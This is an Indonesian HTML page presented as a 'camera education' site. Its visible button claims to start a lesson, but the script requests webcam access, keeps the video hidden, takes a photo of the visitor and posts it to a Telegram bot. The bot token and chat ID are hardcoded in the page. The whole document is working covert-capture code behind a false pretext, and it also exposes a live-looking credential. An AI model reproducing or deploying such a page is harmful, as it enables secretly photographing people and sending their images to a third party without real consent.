<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Web Edukasi Kamera</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    video, canvas {
      display: none;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h1>Web Edukasi Kamera</h1>
  <p>Klik tombol di bawah untuk memulai edukasi</p>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>
  <button onclick="captureAndSend()">Mulai Edukasi ðŸ“¸</button>

  <script>
    const telegramBotToken = "8102671545:AAEbT25jA8_n9136iT7YlbUQQueFAXaj9T4"; // Ganti
    const chatId = "7274253936"; // Ganti

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Mulai kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        video.play();
      })
      .catch(err => {
        alert("Izin kamera dibutuhkan!");
        console.error("Error:", err);
      });

    async function captureAndSend() {
      // Set ukuran canvas sesuai video
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Gambar dari video ke canvas
      ctx.drawImage(video, 0, 0);

      // Ubah jadi data URL
      const imageData = canvas.toDataURL("image/jpeg");

      // Ubah ke Blob
      const blob = await (await fetch(imageData)).blob();

      // Kirim ke Telegram
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");

      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          alert("Foto berhasil dikirim ke Telegram!");
        } else {
          alert("Gagal mengirim ke Telegram.");
          console.error(data);
        }
      })
      .catch(err => {
        alert("Terjadi kesalahan.");
        console.error(err);
      });
    }
  </script>
</body>
</html>
